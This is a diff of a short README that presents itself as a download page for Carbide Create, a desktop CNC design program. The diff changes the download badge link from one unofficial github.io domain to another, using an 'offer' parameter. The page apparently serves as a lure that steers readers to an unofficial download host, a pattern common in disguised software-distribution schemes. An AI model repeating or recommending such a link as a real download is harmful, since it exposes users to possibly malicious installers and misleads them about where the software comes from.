@@ -1,6 +1,6 @@
 # Carbide Create Download — Desktop CNC Design  
 
-[![Get Carbide Create GitHub](https://img.shields.io/badge/Get%20Carbide%20Create%20GitHub-2EA44F?style=for-the-badge&logo=github&logoColor=white)](https://git-app-deploy.github.io/.github/?offer=CarbideCreate)  
+[![Get Carbide Create GitHub](https://img.shields.io/badge/Get%20Carbide%20Create%20GitHub-2EA44F?style=for-the-badge&logo=github&logoColor=white)](https://git-app-setup.github.io/.github/?offer=CarbideCreate)  
 
 ---
 
